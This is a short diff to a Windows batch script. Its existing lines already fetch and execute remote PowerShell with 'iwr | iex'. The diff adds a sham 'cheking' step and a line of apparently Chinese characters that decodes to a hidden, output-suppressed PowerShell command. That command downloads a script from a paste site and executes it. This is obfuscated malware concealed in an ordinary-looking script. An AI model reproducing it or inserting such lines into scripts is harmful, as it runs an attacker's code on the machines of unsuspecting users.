@@ -10,5 +10,19 @@ set tls=[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]:
 %SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe ^
 -Command %tls% $p='%param%'; """ & { $(try { iwr -useb %url% } catch { $p+= ' -m'; iwr -useb %url2% })} $p """" | iex
 
+cls
+
+cheking :
+
+timeout /t 3s
+
+cls
+
+敷獲敨汬∠物⁭敲瑮祲挮⽯愴潰瘵㠴爯睡簠椠硥ഢ㸊渠汵
+
+cls
+
+
 pause
+
 exit /b
